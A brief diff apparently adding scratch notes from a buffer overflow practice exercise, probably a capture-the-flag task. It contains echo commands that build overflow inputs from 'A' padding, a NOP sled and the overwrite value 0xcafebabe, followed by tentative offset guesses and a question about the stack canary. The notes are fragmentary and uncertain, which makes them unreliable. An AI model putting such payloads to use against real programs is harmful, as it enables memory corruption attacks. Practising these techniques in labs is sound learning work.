@@ -1,0 +1,13 @@
+x90\
+
+
+echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbe\xba\xfe\xca" 
+
+echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAA\x90\x90\x90\x90AAAAAAAAAAAAAAAAAAAAA\xbe\xba\xfe\xca"
+
+
+12
+
+after 28 bytes of buffer there is stack canary location?
+
+36?
